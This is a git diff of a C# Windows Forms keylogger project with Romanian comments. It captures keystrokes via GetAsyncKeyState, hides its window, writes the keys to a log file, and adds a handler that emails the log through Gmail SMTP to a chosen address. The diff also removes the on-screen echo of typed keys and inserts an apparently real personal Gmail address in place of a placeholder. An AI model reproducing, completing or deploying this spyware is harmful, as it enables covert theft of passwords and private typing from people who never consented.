@@ -29,10 +29,10 @@ namespace Keylogger
         public Form1()
         {
             InitializeComponent();
-            //comentariu
+
 
             _proxy = new Proxy();
-            _mailSender = new MailSender("smtp.gmail.com", 587, "YOUR-EMAIL-1@gmail.com");// email doar de tip gmail.
+            _mailSender = new MailSender("smtp.gmail.com", 587, "mihaluca.sergiu1@gmail.com");// email doar de tip gmail.
             _keyLogger = new KeyLogger();
         }
         string data = "";
@@ -42,6 +42,10 @@ namespace Keylogger
         [DllImport("User32.dll")]
         private static extern short GetAsyncKeyState(System.Int32 vKey);
         StringBuilder keyBuffer;
+        
+
+
+
 
 
 
@@ -61,14 +65,14 @@ namespace Keylogger
             }
         }
 
-        private void button1_Click(object sender, EventArgs e)
+        private void buttonStart_Click(object sender, EventArgs e)
         {
             this.Opacity = 0;
             key.Enabled = true;
             log.Enabled = true;
             notifyIcon1.ShowBalloonTip(5000);
-            button2.Enabled = true;
-            button1.Enabled = false;
+            buttonStop.Enabled = true;
+            buttonStart.Enabled = false;
         }
 
         private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
@@ -76,6 +80,7 @@ namespace Keylogger
             this.Opacity = 0;
         }
         string msg = "";
+
         bool capslock;
         //Metoda Key_tick trebuie sa ramane aici, apartine de interfata(trebuie modificat sa mearga cu apelurile din KeyLogger class. Adica codul ce tine de logger sa fie in clasa Logger aici sa se faca doar actualizari
         // Sa fie fiecare modul cu specificul lui.
@@ -236,7 +241,6 @@ namespace Keylogger
                        case "Lshiftkey":
                        case "lshiftkey":
                             msg = "";
-                            ///test comm for commits
                             break;
 
                        case "LCONTROLKEY":
@@ -292,8 +296,7 @@ namespace Keylogger
                            catch { MessageBox.Show(sp.ToString()); }
                            msg = ab.ToString(); shift = 0;
                         }
-                        label1.Text = shift.ToString() + "  " + msg.ToString();
-                        richTextBox1.Text += msg;
+                        
                         
                         shift = 0;
                     }
@@ -301,8 +304,7 @@ namespace Keylogger
                     {
                      if(shift>= 2)shift--;
                         keyBuffer.Append(msg);
-                        label1.Text = shift.ToString() + "  " + msg.ToString();
-                        richTextBox1.Text += msg;
+                        
                     }
                 }
             }		
@@ -314,40 +316,57 @@ namespace Keylogger
             key.Enabled = true;
             log.Enabled = true;
             notifyIcon1.ShowBalloonTip(5000);
-            button2.Enabled = true;
-            button1.Enabled = false;
-            
-            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
-            richTextBox1.Text += userName + "     :    ";
+            buttonStop.Enabled = true;
+            buttonStart.Enabled = false;
             keyBuffer = new StringBuilder();
 
-        }
+            smtpClient = "smtp.gmail.com";
+            smtpPort = "587";
+            mailfrom = "YOUR-EMAIL-1@gmail.com";
 
+
+        }
+        string smtpClient, smtpPort, mailfrom;
+
+        public string EmailAddress
+        {
+            get { return this.textBoxMail.Text; }
+        }
         
+
         private void log_Tick(object sender, EventArgs e)
         {
-            CreateLog(@"D:\logfilebest.txt");
+            CreateLog(Application.StartupPath + @"\log.txt");
         }
-        private void button2_Click(object sender, EventArgs e)
+        private void buttonStop_Click(object sender, EventArgs e)
         {
             key.Enabled = false;
             log.Enabled = false;
-            button1.Enabled = true;
-            button2.Enabled = false;            
+            buttonStart.Enabled = true;
+            buttonStop.Enabled = false;            
         }
 
         private void timer1_Tick(object sender, EventArgs e)
         {
-            //am nevoie de calea fisierului unde a-ti scris mesajul pentru a folosi sablonul proxy.
-            string path = "test";
-           //_mailSender.SendMail(_proxy.GetDocument(path));
+            //am nevoie de calea fisierului unde ati scris mesajul pentru a folosi sablonul proxy.
+            string path = Application.StartupPath + @"\log.txt";
+            //var form = new Form1();
+            //form.ShowDialog();
+            //var emailaddress = form.EmailAddress;
+            
+            //_mailSender.SendMail(_proxy.GetDocument(path));
         }
 
-        private void button3_Click(object sender, EventArgs e)
+        private void buttonSendLog_Click(object sender, EventArgs e)
         {
-            //am nevoie de calea fisierului unde a-ti scris mesajul pentru a folosi sablonul proxy.
-            string path = "test";
-            //_mailSender.SendMail(_proxy.GetDocument(path));
+            //log-ul va fi creat in calea unde este executabilul
+            string path = Application.StartupPath + @"\log.txt";
+            //var form = new Form1();
+            //form.ShowDialog();
+            //var emailaddress = form.EmailAddress;
+            //MessageBox.Show(textBoxMail.Text);
+            _mailSender.SendMail(_proxy.GetDocument(path),textBoxMail.Text);
+            
         }
     }
 }
